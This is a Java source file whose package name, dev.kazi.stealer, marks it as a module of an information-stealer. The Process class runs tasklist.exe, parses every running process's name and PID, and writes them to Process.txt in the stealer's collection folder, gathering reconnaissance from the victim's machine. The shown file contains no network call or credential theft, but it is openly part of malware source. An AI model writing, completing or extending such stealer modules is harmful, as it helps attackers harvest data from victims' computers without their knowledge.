package dev.kazi.stealer.node.nodes.impl;

import java.io.IOException;
import java.util.Scanner;
import java.io.BufferedWriter;
import java.io.FileWriter;
import dev.kazi.stealer.node.Category;
import dev.kazi.stealer.node.Node;

public class Process extends Node {

    public Process() {
        super(Category.FILE);
    }
    
    @Override
    public void createNode() {
        try {
            final java.lang.Process process = new ProcessBuilder(new String[] { "tasklist.exe", "/fo", "csv", "/nh" }).start();
            final FileWriter writer = new FileWriter(this.getFolder() + "\\Process.txt", true);
            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
            new Thread(() -> {
                final Scanner sc = new Scanner(process.getInputStream());
                if (sc.hasNextLine()) {
                    sc.nextLine();
                }
                while (sc.hasNextLine()) {
                    final String line = sc.nextLine();
                    final String[] parts = line.split(",");
                    final String unq = parts[0].substring(1).replaceFirst(".$", "");
                    final String pid = parts[1].substring(1).replaceFirst(".$", "");
                    try {
                        bufferedWriter.write("Name: " + unq + " - PID: " + pid + "\n");
                    }
                    catch (final IOException iOException2) {
                        throw new RuntimeException(iOException2);
                    }
                }
                return;
            }).start();
            process.waitFor();
            bufferedWriter.close();
        }
        catch (final IOException | InterruptedException iOException) {
            iOException.printStackTrace();
        }
    }
}
